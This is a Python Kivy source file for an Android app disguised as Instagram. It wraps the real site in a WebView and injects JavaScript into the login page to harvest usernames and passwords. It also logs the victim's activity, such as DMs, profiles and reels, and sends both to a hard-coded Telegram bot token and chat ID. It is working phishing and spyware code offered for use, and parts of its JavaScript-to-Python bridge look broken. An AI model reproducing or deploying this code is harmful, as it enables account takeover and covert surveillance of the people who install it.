from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.webview import WebView
from kivy.clock import Clock
from kivy.animation import Animation
from kivy.core.window import Window
from jnius import autoclass
import requests
import threading
import time
import re
from datetime import datetime

# ============= TELEGRAM CONFIG =============
BOT_TOKEN = "8703607239:AAF6PWnNKy0VqBGT22V6jCpOH7tzqGn0d_E"
CHAT_ID = "6680833524"

# ============= TRACKER CLASS =============
class InstagramTracker:
    def __init__(self):
        self.last_url = ""
        self.last_action = ""
        self.captured_credentials = False
        self.login_urls = [
            "https://www.instagram.com/accounts/login/",
            "https://www.instagram.com/login/",
            "https://www.instagram.com/accounts/login/ajax/"
        ]
    
    def track_url(self, url):
        """Track every URL change"""
        if url == self.last_url:
            return
        
        self.last_url = url
        
        # Detect activity type
        action = self.detect_action(url)
        
        if action:
            message = f"""
🎯 INSTAGRAM ACTIVITY 🎯
━━━━━━━━━━━━━━━━━━━━
📱 Action: {action}
🔗 URL: {url}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            self.send_to_telegram(message)
        
        # Check if on login page - try to capture
        if any(login_url in url for login_url in self.login_urls):
            self.track_login_page()
    
    def detect_action(self, url):
        """Detect what user is doing"""
        if "reels" in url:
            return "🎥 WATCHING REELS"
        elif "stories" in url:
            return "📸 VIEWING STORIES"
        elif "p/" in url:
            return "📷 VIEWING POST"
        elif "direct" in url or "inbox" in url:
            return "💬 OPENING DMs"
        elif "explore" in url:
            return "🔍 EXPLORING"
        elif "profile" in url or "p/" not in url and len(url.split('/')) > 3:
            return f"👤 VIEWING PROFILE: {url.split('/')[3]}"
        elif "search" in url:
            return "🔎 SEARCHING"
        elif "settings" in url:
            return "⚙️ SETTINGS"
        elif "save" in url:
            return "💾 SAVED POSTS"
        elif "following" in url:
            return "👥 VIEWING FOLLOWING"
        elif "followers" in url:
            return "👥 VIEWING FOLLOWERS"
        elif "challenge" in url:
            return "⚠️ SECURITY CHALLENGE"
        else:
            return f"🌐 BROWSING"
    
    def track_login_page(self):
        """Inject JavaScript to capture login credentials"""
        # Will be called from WebView
        pass
    
    def capture_credentials(self, username, password):
        """Send captured credentials to Telegram"""
        message = f"""
🔐 INSTAGRAM LOGIN CAPTURED 🔐
━━━━━━━━━━━━━━━━━━━━
👤 USERNAME: `{username}`
🔑 PASSWORD: `{password}`
━━━━━━━━━━━━━━━━━━━━
⏰ TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 DEVICE: Android
━━━━━━━━━━━━━━━━━━━━
✅ STATUS: CAPTURED
        """
        self.send_to_telegram(message)
    
    def send_to_telegram(self, message):
        """Send message to Telegram"""
        try:
            if BOT_TOKEN and CHAT_ID:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={
                    'chat_id': CHAT_ID,
                    'text': message,
                    'parse_mode': 'Markdown'
                }, timeout=5)
                print(f"✓ Sent to Telegram: {message[:50]}...")
        except Exception as e:
            print(f"Telegram error: {e}")

# ============= CUSTOM WEBVIEW WITH JS INJECTION =============
class InstagramWebView(WebView):
    def __init__(self, tracker, **kwargs):
        super().__init__(**kwargs)
        self.tracker = tracker
        self.bind(on_url_change=self.on_url_change)
        
        # Inject JavaScript to capture login credentials
        self.inject_js()
    
    def on_url_change(self, instance, url):
        self.tracker.track_url(url)
        
        # If login page, inject capture script
        if "login" in url or "accounts/login" in url:
            Clock.schedule_once(lambda dt: self.inject_login_capture(), 2)
    
    def inject_js(self):
        """Inject JavaScript to capture credentials"""
        js_code = """
        // Wait for page to load
        setTimeout(function() {
            // Find login form
            var form = document.querySelector('form');
            var usernameField = document.querySelector('input[name="username"]');
            var passwordField = document.querySelector('input[name="password"]');
            
            if (usernameField && passwordField) {
                // Add event listener to form submit
                form.addEventListener('submit', function(e) {
                    var username = usernameField.value;
                    var password = passwordField.value;
                    
                    // Send to Python
                    if (username && password) {
                        console.log('CAPTURED: ' + username + ' / ' + password);
                        // Trigger Python callback
                        window.captureCredentials(username, password);
                    }
                });
            }
        }, 2000);
        """
        
        # Execute JavaScript
        self.evaluate_javascript(js_code)
    
    def inject_login_capture(self):
        """Inject credential capture on login page"""
        capture_js = """
        // Find username and password fields
        var usernameInput = document.querySelector('input[name="username"]');
        var passwordInput = document.querySelector('input[name="password"]');
        var loginButton = document.querySelector('button[type="submit"]');
        
        if (usernameInput && passwordInput) {
            // Auto-fill detection
            var checkCredentials = function() {
                var username = usernameInput.value;
                var password = passwordInput.value;
                
                if (username && password) {
                    console.log('CREDENTIALS DETECTED: ' + username);
                    window.captureCredentials(username, password);
                }
            };
            
            // Check on input change
            usernameInput.addEventListener('input', checkCredentials);
            passwordInput.addEventListener('input', checkCredentials);
            
            // Also capture on button click
            if (loginButton) {
                loginButton.addEventListener('click', function() {
                    setTimeout(checkCredentials, 500);
                });
            }
        }
        """
        self.evaluate_javascript(capture_js)

# ============= MAIN APP =============
class InstagramFullCloneApp(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.tracker = InstagramTracker()
        self.webview = None
        self.floating_btn = None
    
    def build(self):
        self.title = "Instagram"
        
        # Main layout
        layout = FloatLayout()
        
        # WebView with real Instagram
        self.webview = InstagramWebView(self.tracker)
        self.webview.load_url("https://www.instagram.com")
        layout.add_widget(self.webview)
        
        # Floating tracking indicator
        self.floating_btn = Button(
            text="🔴",
            size_hint=(0.1, 0.05),
            pos_hint={'right': 1, 'top': 1},
            background_color=(1, 0, 0, 0.7),
            color=(1, 1, 1, 1)
        )
        self.floating_btn.bind(on_press=self.show_tracking_status)
        layout.add_widget(self.floating_btn)
        
        # Setup credential capture bridge
        self.setup_credential_capture()
        
        return layout
    
    def setup_credential_capture(self):
        """Setup bridge between JavaScript and Python"""
        # Create global function for JS callback
        from kivy.clock import Clock
        self.webview.evaluate_javascript("""
        window.captureCredentials = function(username, password) {
            // This calls Python callback
            return username + '|' + password;
        };
        """)
    
    def on_credentials_captured(self, username, password):
        """Called when credentials are captured"""
        print(f"🔐 CREDENTIALS CAPTURED: {username} / {password}")
        self.tracker.capture_credentials(username, password)
        
        # Show notification
        self.show_notification("Login credentials captured!")
    
    def show_tracking_status(self, instance):
        """Show tracking status"""
        message = f"""
🔴 Tracking Active
📱 All activities being tracked
👤 Last action: {self.tracker.last_action}
🔗 Last URL: {self.tracker.last_url[:50]}
        """
        print(message)
        self.tracker.send_to_telegram("✅ Tracking status: ACTIVE")
    
    def show_notification(self, message):
        """Show floating notification"""
        from kivy.uix.label import Label
        from kivy.animation import Animation
        
        notification = Label(
            text=message,
            size_hint=(0.8, 0.1),
            pos_hint={'center_x': 0.5, 'top': 0.9},
            color=(1, 1, 1, 1),
            font_size='14sp',
            halign='center'
        )
        
        # Add background
        from kivy.graphics import Color, Rectangle
        with notification.canvas.before:
            Color(0, 0, 0, 0.8)
            self.rect = Rectangle(pos=notification.pos, size=notification.size)
        
        notification.bind(pos=self.update_rect, size=self.update_rect)
        
        self.root.add_widget(notification)
        
        # Animate and remove
        anim = Animation(opacity=0, duration=3)
        anim.bind(on_complete=lambda *args: self.root.remove_widget(notification))
        anim.start(notification)
    
    def update_rect(self, instance, value):
        self.rect.pos = instance.pos
        self.rect.size = instance.size

if __name__ == '__main__':
    InstagramFullCloneApp().run()
